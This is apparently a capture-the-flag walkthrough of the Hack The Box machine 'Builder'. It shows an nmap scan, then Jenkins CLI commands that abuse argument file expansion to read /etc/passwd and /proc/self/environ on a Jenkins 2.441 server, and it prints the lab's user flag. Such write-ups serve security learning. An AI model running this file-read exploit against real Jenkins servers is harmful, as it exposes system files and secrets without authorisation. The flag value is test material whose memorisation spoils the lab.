---
title: "Builder from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Builder from HTB
`nmap`gave this:
```
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
1566/tcp  filtered corelvideo
8080/tcp  open     http       Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
| http-robots.txt: 1 disallowed entry 
|_/
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.18)
```
Accessing the `8080`port we find that site runs on `jenkins 2.441`which is exploitable.
```
wget 10.10.11.10:8080/jnlpJars/jenkins-cli.jar
java -jar jenkins-cli-2.441.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/etc/passwd"
--------
------------
 COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
------------\
java -jar jenkins-cli-2.441.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/proc/self/environ"
-----------------
HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https<snip>JENKINS_HOME=/var/jenkins_home<snip>
```
We find that home directory is in `/var/jenkins_home`we can read `user.txt`in there
***
User Flag is: 392c37d12e3c7774b81d37323c1b66bd.
***
